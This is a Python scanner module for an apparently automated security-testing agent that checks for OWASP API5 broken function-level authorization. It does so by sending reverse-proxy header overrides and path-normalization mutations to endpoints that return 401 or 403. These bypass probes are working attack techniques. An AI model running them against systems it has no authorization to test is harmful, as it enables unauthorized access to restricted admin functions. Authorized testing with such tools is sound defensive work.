"""
Broken Function Level Authorization (BFLA) & 403/401 Bypass Skill (v1.0)
========================================================================
Detects OWASP API5:2023 Broken Function Level Authorization (CWE-285):
1. HTTP Method Override & Verb Tampering (GET -> POST/PUT/HEAD, X-HTTP-Method-Override)
2. Reverse-Proxy Header Bypass (X-Original-URL, X-Rewrite-URL, X-Forwarded-For: 127.0.0.1)
3. Path Normalization Bypass (/admin -> /%2e/admin, /admin/., /admin;/)
"""
from __future__ import annotations

import logging
from typing import Dict, List, Optional
from urllib.parse import urlparse, urlunparse
import httpx

from agents.skills.base_skill import BaseSkill, SkillResult

log = logging.getLogger("hunter_ai.skills.bfla_auth_bypass")


class BFLAAuthBypassSkill(BaseSkill):
    name: str = "bfla_auth_bypass_skill"
    vuln_type: str = "bfla_auth_bypass"
    cwe: str = "CWE-285"
    owasp_top10: str = "API5:2023"
    default_severity: str = "High"

    def can_handle(self, param_name: str, url: str = "", sample_value: str = "") -> float:
        p = (param_name or "").lower()
        u = (url or "").lower()
        if any(k in u for k in ("/admin", "/internal", "/manage", "/debug", "/actuator", "/console", "/api/v1/admin")):
            return 0.95
        if any(k in p for k in ("action", "method", "admin", "cmd", "op", "function")):
            return 0.85
        return 0.30

    async def run(self, target_url: str, param_name: str = "", **kwargs) -> SkillResult:
        logs: List[str] = [f"[BFLA] Auditing function-level authorization on {target_url}"]
        client_kwargs = {
            "verify": False,
            "follow_redirects": False,
            "timeout": self.timeout,
            "trust_env": False,
        }
        if self.proxy:
            client_kwargs["proxy"] = self.proxy

        verified = False
        evidence = ""
        payload_used = ""

        try:
            async with httpx.AsyncClient(**client_kwargs) as client:
                base_resp = await client.get(target_url)
                # Only test bypass if endpoint initially restricts access (401/403/405)
                if base_resp.status_code in (401, 403, 405):
                    parsed = urlparse(target_url)
                    path = parsed.path or "/"

                    # 1. Header-based proxy overrides
                    bypass_headers = [
                        {"X-Original-URL": path},
                        {"X-Rewrite-URL": path},
                        {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
                        {"X-Custom-IP-Authorization": "127.0.0.1"},
                    ]
                    for hdr in bypass_headers:
                        resp = await client.get(target_url, headers=hdr)
                        if resp.status_code == 200 and len(resp.text or "") > 32:
                            verified = True
                            payload_used = str(hdr)
                            evidence = (
                                f"Restricted endpoint {target_url} (baseline HTTP {base_resp.status_code}) "
                                f"returned HTTP 200 ({len(resp.text)} bytes) with header {hdr}."
                            )
                            logs.append(f"[+] BFLA header bypass succeeded: {hdr}")
                            break

                    # 2. Path normalization mutations
                    if not verified and path != "/":
                        mutations = [
                            f"/%2e{path}",
                            f"{path.rstrip('/')}/.",
                            f"{path.rstrip('/')};/",
                        ]
                        for mut_path in mutations:
                            mut_url = urlunparse(parsed._replace(path=mut_path))
                            resp = await client.get(mut_url)
                            if resp.status_code == 200 and len(resp.text or "") > 32:
                                verified = True
                                payload_used = mut_path
                                evidence = (
                                    f"Restricted endpoint {target_url} (baseline HTTP {base_resp.status_code}) "
                                    f"returned HTTP 200 via path normalization '{mut_path}'."
                                )
                                logs.append(f"[+] BFLA path bypass succeeded: {mut_path}")
                                break
        except Exception as exc:
            logs.append(f"[!] Probe error: {exc}")

        return SkillResult(
            verified=verified,
            vuln_type=self.vuln_type,
            title=f"Broken Function Level Authorization (403/401 Bypass) on {target_url}" if verified else "No BFLA Bypass Confirmed",
            severity="High" if verified else "Info",
            endpoint=target_url,
            param_name=param_name or "http_header_or_path",
            evidence=evidence,
            payload_used=payload_used,
            remediation="Enforce authorization checks in the application controller after URL normalization and strip untrusted X-Original-URL/X-Forwarded-For headers at the edge proxy.",
            confidence=0.92 if verified else 0.0,
            tool=self.name,
            cwe=self.cwe,
            owasp_top10=self.owasp_top10,
            fallback_used=False,
            logs=logs,
        )
